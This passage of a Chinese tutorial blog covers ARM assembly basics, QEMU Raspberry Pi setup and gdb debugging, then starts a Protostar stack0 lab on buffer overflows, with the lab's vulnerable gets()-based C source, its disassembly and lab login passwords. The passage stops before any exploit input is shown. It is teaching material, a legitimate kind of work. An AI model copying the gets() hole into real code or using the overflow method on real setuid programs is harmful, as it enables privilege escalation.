	cmp r0,r1
```
之后可以使用addlt指令
```
addlt：意思是加小于(+<)，这个指令只会触发比较结果小于的情况
```
```
.global _start
_start:
	mov r0,#2
	mov r1,#4
	cmp r0,r1
	addlt r2,#1
```
![](https://img-blog.csdnimg.cn/e3895bd29e6141e1b72f8140300f32fc.png#id=DAPCM&originHeight=221&originWidth=338&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
只用四行代码就实现了上面的功能，我们执行看看
![](https://img-blog.csdnimg.cn/db9313a33e124f63ba616f580989ba4b.png#id=UMiW3&originHeight=334&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，确实实现了我们想要的功能
比如还有movge……很多组合，这样可以使程序更加简洁
```
movge：比较结果是大于等于之后进行移动操作
```
## 使用链接寄存器进行分支并返回和从堆栈内存中保存和检索数据
在汇编里也有函数的概念，我们将使用函数看看如何调用一个位置并返回
```
调用：在程序里移动到不同的标签，然后执行标签里的内容
```
### 使用链接寄存器进行分支并返回
假设我要写一个程序，作用是将两个数值相加，然后将这个功能设置为一个函数，以便重复利用
首先我们随便移动一些值到寄存器里
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
```
然后写一个分支，作用是相加两个寄存器的值
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
	bal add2   //跳转到add2分支里执行内容

add2:
	add r2,r0,r1   //r2 = r0 + r1
```
![](https://img-blog.csdnimg.cn/7a8832b711b348508fd710f8cfec0435.png#id=nDE89&originHeight=257&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后按f5执行程序，可以看到，这个程序以我们想要的方式执行了
![](https://img-blog.csdnimg.cn/861c283cb5894667a04d9c4ce6082254.png#id=bv6D3&originHeight=445&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
但现在的问题是，如果我想在函数调用后继续执行主函数里的内容，但是在这里调用之后就退出程序了
我们可以添加一个返回地址就能回到主函数里了
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
	bl add2   //bl：跳转指令，用于返回到跳转指令之后的那个指令继续执行
	mov r3,#3

add2:
	add r2,r0,r1
```
在使用了bl指令之后，在寄存器中有一个叫做lr的链接寄存器，作用是保存子程序返回地址，然后我们执行程序看看
![](https://img-blog.csdnimg.cn/96f297b6959f4c19a5f1c051480aa5c0.png#id=oWC5m&originHeight=472&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在实行了跳转之后，lr寄存器里的值就是之后mov操作的地址
之后可以使用bx指令
```
bx：跳转到指定寄存器里的位置
```
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
	bl add2
	mov r3,#3

add2:
	add r2,r0,r1
	bx lr   //跳转到lr链接寄存器里的位置
```
![](https://img-blog.csdnimg.cn/159ba2c517f54146a64ed3556fa35324.png#id=r8cyY&originHeight=229&originWidth=401&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们执行完整的程序看看
![](https://img-blog.csdnimg.cn/e529290471724866b5df846dd613d4cb.png#id=hCfzC&originHeight=424&originWidth=949&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到成功返回到了主函数里继续执行mov的操作了
### 从堆栈内存中保存和检索数据
在我们写程序时，为了进行不同的计算，我们需要在写的过程中使用不同的寄存器，但他内部的寄存器是有限的，该怎么办呢

我们可以在使用后恢复原来寄存器里的值
这里写一个简单的小程序来演示，首先移动一些值到寄存器里
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
```
然后我们调用一个函数，移动一些值到相同的寄存器里，然后相加，最后返回
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
	bl baimao   //跳转到baimao分支里执行内容
baimao:
	mov r0,#5
	mov r1,#5
	add r2,r0,r1   //r2 = r0 + r1
	bx lr   //跳转到lr链接寄存器里的位置
```
![](https://img-blog.csdnimg.cn/0d6c9d694f0e46dcbc7105de2a33b7f1.png#id=McXDO&originHeight=262&originWidth=311&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们进入baimao这个函数时，r0和r1寄存器里的值将被覆盖
![](https://img-blog.csdnimg.cn/f76b403b39ba468d82bfe9fd524e92c6.png#id=z8f80&originHeight=489&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们可以将r0和r1寄存器的值push进堆栈中，这样做的目的是，当程序执行完之后，我们还可以pop出堆栈，还原寄存器里的数值
```
.global _start
_start:
	mov r0,#1
	mov r1,#3
	push {r0,r1}   //将r0和r1寄存器里的值push进堆栈
	bl baimao
	pop {r0,r1}  //在函数执行完之后，将堆栈里的值弹出来，还原寄存器里的数值
	b end  //跳转到end分支，结束程序
baimao:
	mov r0,#5
	mov r1,#5
	add r2,r0,r1
	bx lr   //跳转到lr链接寄存器里的位置
end:
```
![](https://img-blog.csdnimg.cn/81c886cd12cc4cbd99fd2ed6e980d198.png#id=SnRMH&originHeight=377&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们运行程序，看看会发生什么
在执行了push操作后，可以在内存中发现1，3数值
![](https://img-blog.csdnimg.cn/d757a759d5c5405bb296de584c1d42c5.png#id=mXVZE&originHeight=360&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/856e744520e44b47bb20ed0c79dc2d17.png#id=SJext&originHeight=245&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
而sp寄存器指向了存储值的位置，之后pop的时候可以直接还原寄存器里的值
```
sp：堆栈指针寄存器
```
![](https://img-blog.csdnimg.cn/8e3efc212c944c41aa66eae6dc465b50.png#id=JcatH&originHeight=129&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
继续执行，可以看到我们的数据被覆盖了
![](https://img-blog.csdnimg.cn/0449e4ad315e4ffe997ba3fdd7a8fa02.png#id=gaQY0&originHeight=482&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
返回执行了pop之后，值就还原了
![](https://img-blog.csdnimg.cn/b5415971413d4daeabf3e922c411c84f.png#id=IhaoN&originHeight=356&originWidth=1071&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 硬件交互和为 ARM环境 设置 QEMU
### 硬件交互
在这个模拟器的右边有各种不同的硬件设备，这里演示两个硬件设备
![](https://img-blog.csdnimg.cn/d81c2ef28fcc40e7bad68d65c7ccd5be.png#id=Yh2Cx&originHeight=861&originWidth=1904&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
switches是输入硬件，LED是输出硬件，我们可以写一个小程序让他执行
首先我们需要声明一个变量来存储switches的位置以及LED的位置，上面标注了硬件的位置
![](https://img-blog.csdnimg.cn/b340ac4a14a3409995a04c25ccf0d14f.png#id=U4ZZf&originHeight=181&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
首先我们先调用switches
```
.equ switch, 0xff200040 
.global _start
_start:
	ldr r0,=switch
```
但我们这样直接存储位置的话，只是一个普通的变量，并没有什么用
![](https://img-blog.csdnimg.cn/0be459b65a5c4c5e92d03fe62eff0375.png#id=Lg5ZO&originHeight=317&originWidth=863&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
如果我们想用这个寄存器，我们可以打开switches上的开关，这里的意思是2的一次方，二次方……
![](https://img-blog.csdnimg.cn/df0934b477c3430b8059457ecbbb8058.png#id=QN32Q&originHeight=152&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
如果我们选择了1这个开关，计算的时候就会有变化
```
.equ switch, 0xfff200040 
.global _start
_start:
	ldr r0,=switch
	ldr r1,[r0]
```
![](https://img-blog.csdnimg.cn/9e9731830a3b43ba8b7f0ab860a844b5.png#id=n6d1v&originHeight=373&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，r1寄存器里的值是2，因为2的一次方是2，我们选择其他选项试试
![](https://img-blog.csdnimg.cn/1deb28ccece4478e9ba3ce251bad87c3.png#id=x9n3H&originHeight=359&originWidth=1539&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到r1寄存器里的值为7，因为2的零次方+2的一次方+2的二次方

这是从硬件获取输入的一个简单的演示
硬件第一排的LED最右边的代表二进制的第一个数值，然后是第二个数值，……以此类推
```
.equ switch,0xff200040 
.equ led,0xff200000
.global _start
_start:
	ldr r0,=switch
	ldr r1,[r0]
	
	ldr r0,=led   //覆盖r0之前的地址，变成led的地址
	str r1,[r0]  //str：字数据存储指令，因为LED是输出硬件，我们需要把值存入后才能输出
```
执行程序，可以看到LED的灯亮起，红的是1，不亮的则为0，因为r1寄存器里的值十进制为7，二进制就为0111
![](https://img-blog.csdnimg.cn/f01f03e7edc84280a79191302a0344d6.png#id=ZYQ97&originHeight=440&originWidth=1705&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 为 ARM 设置 Qemu
现在我们要在linux搭建运行arm的环境
首先下载这个文件，这可以模拟操作系统环境，还有其他版本的环境，目前这个版本和qemu工具运行是最稳定的：
```
https://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
```

![](https://img-blog.csdnimg.cn/194e8564bc3544e2bc20c81521b42c22.png#id=djDaq&originHeight=394&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后需要一个内核：
```
https://github.com/dhruvvyas90/qemu-rpi-kernel/blob/master/kernel-qemu-4.4.34-jessie
```
下载好后放到同一个文件夹下
![](https://img-blog.csdnimg.cn/e0087f36ba8c44a095f0eba8c3621767.png#id=FcRRI&originHeight=231&originWidth=688&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后安装qemu
```
apt-get install qemu-system
```
安装完成后执行这一条命令来创建环境
```
qemu-system-arm -kernel kernel-qemu-4.4.34-jessie -cpu arm1176 -m 256 -M versatilepb -serial stdio -append "root=/dev/sda2 rootfstype=ext4 rw" -hda 2017-04-10-raspbian-jessie.img -nic user,hostfwd=tcp::5022-:22 -no-reboot
```
![](https://img-blog.csdnimg.cn/8824e4951ae442648fe46e81afd014ba.png#id=mPsHj&originHeight=862&originWidth=1323&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/e7ae77997af14433962c5a30123a025f.png#id=PG24d&originHeight=708&originWidth=978&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在树莓派虚拟环境就安装好了，打开树莓派里的终端，输入命令打开ssh
```
sudo service ssh start
```
![](https://img-blog.csdnimg.cn/7865a3c7f66b431e822253735c11e1cb.png#id=GQgjv&originHeight=603&originWidth=790&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后在本地终端里连接ssh
```
ssh pi@127.0.0.1 -p 5022
```
输入yes，密码为raspberry
![](https://img-blog.csdnimg.cn/d44028b7c96749e882ac1d9db180007c.png#id=hSV1l&originHeight=602&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## HelloWorld和gdb调试Arm程序
### HelloWorld
连接ssh后，然后创建一个文件夹来存放我们写的项目
```
mkdir HelloWorld
cd HelloWorld
```
然后用nano工具创建一个文件
```
nano HelloWorld.s
```
![](https://img-blog.csdnimg.cn/8a009bf180754bd7aadb34424403c968.png#id=DjRcA&originHeight=697&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
首先创建基本的标签，写入我们想输出的字符串
```
.global _start
_start:


.data
message:
        .asciz "hello world !\n"    //.asciz：ascii集，后面是输出的字符
len = .-message   //定义字符串的长度
```
然后就要写主程序了，第一件事是我们要把数据或者字符存放到哪里，第二件事是要输出什么，第三件事是我们输出字符的长度是多少
```
.global _start
_start:

        MOV R0,#1   //计算机标准输出
        LDR R1,=message   //告诉程序字符串位置在哪里
        LDR R2,=len   //告诉程序要输出的字符串长度
        MOV R7,#4   //当我们与操作系统交互时，r7是一个特殊的寄存器，4意思是输出
		SWI 0  //中断程序

		MOV R7,#1   //1终止此程序
		SWI 0   //中断程序

.data   
message:
        .asciz "hello world !\n"
len = .-message
```
![](https://img-blog.csdnimg.cn/a41dc0dbc947488aa027073832ba1a27.png#id=NYdRj&originHeight=700&originWidth=1102&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
ctrl+o保存，然后ctrl+x退出
![](https://img-blog.csdnimg.cn/6b24cff4b7bb4af5b156866b5d2b0479.png#id=YECHk&originHeight=417&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后编译程序
```
as HelloWorld.s -o helloworld.o
ld helloworld.o -o hellworld
```
![](https://img-blog.csdnimg.cn/a7198dc64e5e49d78910f7766c33e0ba.png#id=Mrimj&originHeight=199&originWidth=739&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
执行
```
./helloworld
```
![](https://img-blog.csdnimg.cn/6f41aeaf89234a37a1579c8380c5b177.png#id=z5WsB&originHeight=211&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
成功输出
### gdb调试Arm程序
gdb是linux动态调试程序的工具
```
chmod 777 helloworld
gdb helloworld
```
![](https://img-blog.csdnimg.cn/11954f4eb6344f4390e3fa65f064464d.png#id=Ac1wc&originHeight=452&originWidth=879&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后对程序添加断点，让程序停在我们想要分析的地址上
```
b _start   //在_start处添加断点
disassemble _start  //查看_start的汇编代码
```
![](https://img-blog.csdnimg.cn/6c4b2428fa6440888343994fe71fd984.png#id=R692J&originHeight=710&originWidth=1272&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
输入run就能停在断点处，现在程序是正在运行中的
![](https://img-blog.csdnimg.cn/c94febebe7af4acc9ec07f564c0bff57.png#id=hFHvM&originHeight=320&originWidth=624&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
输入layout asm 可以获得一个方便观察的界面
![](https://img-blog.csdnimg.cn/3650d11c9bad45849b497be96fe040c0.png#id=AuthM&originHeight=527&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，这里的汇编代码和我们写的差不多，输入info register [小写的寄存器] 可以查看当前寄存器的值，现在没有执行，所以是0
![](https://img-blog.csdnimg.cn/ec9c4093239547ed98ebc5a8aae10b16.png#id=OoYAK&originHeight=221&originWidth=683&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
或者输入layout regs，上面就会显示寄存器的界面
![](https://img-blog.csdnimg.cn/6e5d2dbb828045f8b5ef0697181f9b93.png#id=DpFae&originHeight=547&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以用键盘上的上下键查看其他地址，输入stepi，执行第一条汇编代码
![](https://img-blog.csdnimg.cn/5f36cab315134f768d2e9fe18b4cf06a.png#id=j88YS&originHeight=604&originWidth=927&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，r0寄存器里的值就为1了，使用x/16x $r1 查看r1内存地址里的值
![](https://img-blog.csdnimg.cn/30dcbd7e29294b0ba6170ed8befc5144.png#id=lNtYe&originHeight=698&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
x/10d $r1以十进制显示内存里的数值
![](https://img-blog.csdnimg.cn/1d1fc89ab175435bbac338d460d8c63c.png#id=U0gXc&originHeight=357&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
x/10c $r1以ascii码新式查看内存里的数据
![](https://img-blog.csdnimg.cn/5359ea0f4b7d4e00adc7eb1d3a6c464e.png#id=gvXIr&originHeight=347&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
# 栈利用基础
栈溢出（Stack Overflow）是一种常见的软件安全漏洞，发生在程序的栈内存区域分配不当时，特别是当程序试图向栈写入超过其分配空间的数据时。栈是操作系统为程序运行时分配的一块连续内存区域，用于存储局部变量、函数参数、返回地址等

栈溢出可以导致程序异常终止或行为不稳定。当栈空间被耗尽或栈内存被不正确地覆盖时，程序可能无法继续正常执行，导致崩溃。这不仅影响用户体验，也可能导致数据丢失或损坏。更严重的是，栈溢出可以被恶意利用来破坏程序的安全性，执行任意代码
## PWN基础入门
这是一个入门pwn很好的靶场，这个靶场包括了：
```
网络编程
处理套接字
栈溢出
格式化字符串
堆溢出
写入shellcode
```
下载地址：
```
https://exploit.education/downloads/
```
![](https://img-blog.csdnimg.cn/ee834809527b4c2db5007782b40253e0.png#id=qbnzo&originHeight=835&originWidth=1690&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 实验环境部署
```
Protostar靶机下载地址：https://exploit.education/protostar/
windoows的ssh连接软件：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
下载完Protostar的镜像文件后，将其安装到vmware上，然后打开
```
账号为user，密码user
如何切换到root权限：进入user用户然后 su root 密码为godmod
```
ssh远程连接
![](https://img-blog.csdnimg.cn/db0b363073f04bb39c4252c0c5de92bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_17,color_FFFFFF,t_70,g_se,x_16#id=uPmS3&originHeight=449&originWidth=466&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
输入IP后点击打开，输入账号密码，然后输入/bin/bash，更换为可以补全字符串的shell
![](https://img-blog.csdnimg.cn/99e6accc005d4c39bc256b6b3b29c1c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=S4puy&originHeight=969&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在网站的Protostar靶机的介绍处，我们要破解的题目存放在这个目录下
```
/opt/protostar/bin
```
我们进入这个目录，详细查看文件
```
ls -al
```
![](https://img-blog.csdnimg.cn/77f0df2d68f94218b3701f17db931679.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=cUyMw&originHeight=969&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
发现文件都是红色的，我们详细的查看文件
```
flie stack0
```
![](https://img-blog.csdnimg.cn/c096be93aacb4799a6fdbe890cc31608.png#id=Yjs2b&originHeight=52&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这是一个32位的setuid程序
## setuid
什么是setuid？
```
setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配
```
这么说起来有点绕，我们来举一个例子
```
一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了
```
演示
我们用user用户运行一个vim
然后新开一个窗口查看后台进程
```
ps -aux
```
![](https://img-blog.csdnimg.cn/bbc3e82f1a2948209a4a1d37cdbc6ae5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=xUbTE&originHeight=975&originWidth=1790&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下靶机上的setuid文件看看
![](https://img-blog.csdnimg.cn/30c53f076fde40398592a2264a8f5a9f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=qecJq&originHeight=970&originWidth=1762&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行
我们查看文件的权限
![](https://img-blog.csdnimg.cn/0f59f934076248e79dbcde8ff371e9e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=Oemzi&originHeight=472&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
r代表读，w代表写，x代表执行，那s是什么呢
```
s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的
```
当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的
我们的目标就是，破解这些文件然后拿到root权限
### STACK ZERO程序源代码分析
![](https://img-blog.csdnimg.cn/528a83f5bf8a40f994f0ad1a26562b83.png#id=kQ7ef&originHeight=330&originWidth=1124&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们破解一个简单的题，通过分析汇编语言，以及相关的知识，来带大家进一步了解程序是如何运行的以及如何破解的
```
题目的源代码：https://exploit.education/protostar/stack-zero/
```
题目详情：这个级别介绍了内存可以在其分配区域之外访问的概念，堆栈变量的布局方式，以及在分配的内存之外进行修改可以修改程序执行。
![](https://img-blog.csdnimg.cn/51914e879a634eb2a12862004b435731.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=GhvE9&originHeight=654&originWidth=2101&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
分析源代码，这是由c语言写成的程序，
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;          //定义一个变量
  char buffer[64];           //给buffer变量定义数组，c语言中一个字符数就是一个字符串

  modified = 0;            //modified变量=0
  gets(buffer);             //获取我们的输入，赋予到buffer变量里

  if(modified != 0) {               //如果modified不等于0
      printf("you have changed the 'modified' variable\n");                //打印'成功改变modified变量'字符串
  } else {                        //否则
      printf("Try again?\n");                   //打印'再试一次'
  }
}
```
很明显，我们要使if语句成功判断，打印成功改变变量的字符串，关于如何破解程序，获取root权限，我会在下一篇文章中介绍
### gets函数漏洞分析
在gets函数的官方文档里，有这么一句话
![](https://img-blog.csdnimg.cn/ff7e8adc6a15426594396f8dd3f1792e.png#id=nobXM&originHeight=117&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。
### 汇编分析
我们使用gdb打开程序进行进一步的分析
```
gdb /opt/protostar/bin/stack0
```
![](https://img-blog.csdnimg.cn/d6f32c991813464d911c0ee7186fdb64.png#id=LHNB4&originHeight=199&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们查看程序的汇编代码，来了解程序的堆栈是如何工作的
```
set disassembly-flavor intel 参数让汇报代码美观一点
disassemble main  显示所有的汇编程序指令
```
![](https://img-blog.csdnimg.cn/d147f2cf1b6147e6b2137ca37457d6a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=FkopI&originHeight=374&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```
```
0x080483f4 <main+0>:    push   ebp
```
第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址，在因特尔的指令参考官方资料中，可以看到，mov esp、ebp和pop ebp是函数的开始和结束
[https://www.intel.de/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf](https://www.intel.de/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)
![](https://img-blog.csdnimg.cn/b22519516335499493c5d0213bf155af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=Wb0tH&originHeight=974&originWidth=1298&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在这个程序中，最初操作是将ebp推入栈中，然后把esp的值放入ebp中，而当函数结束时执行了leave操作
```
0x08048433 <main+63>:   leave
leave:
mov esp,ebp
pop ebp
```
可以看到，程序开头和结尾的操作都是对称的
之后执行了如下操作
```
0x080483f7 <main+3>:    and    esp,0xfffffff0
```
AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址
```
0x080483fa <main+6>:    sub    esp,0x60
```
然后esp减去十六进制的60
```
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
```
在内存移动的位置为0，在堆栈上的偏移为0x5c
段地址+偏移地址=物理地址
举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址
这里推荐大家看一下《汇编语言》这本书，在这本书里有很多关于计算机底层的相关知识
```
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
```
lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈
然后DWORD PTR要取eax的地址到esp中
调用gets函数
```
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
```
然后对比之前设置的值，0，用test来检查
```
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
```
这些就是if循环的操作了
### 实战演示
#### 方法一：溢出
```
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```
我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。
```
断点意思就是让程序执行到此“停住”，不再往下执行
```
```
b *0x0804840c
```
然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里
```
b *0x08048411
```
![](https://img-blog.csdnimg.cn/65821984a8644803b1da2671a01c7c3a.png#id=m2WLj&originHeight=75&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后设置
```
define hook-stop
```
这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令
```
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
```
![](https://img-blog.csdnimg.cn/76672676c8b64ab2bc5a6526a431991c.png#id=Lh2BD&originHeight=118&originWidth=782&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们输入run运行程序到第一个断点
```
r
```
![](https://img-blog.csdnimg.cn/b0d907a84be94f3eaddd56f2ea988395.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=lTKkQ&originHeight=481&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
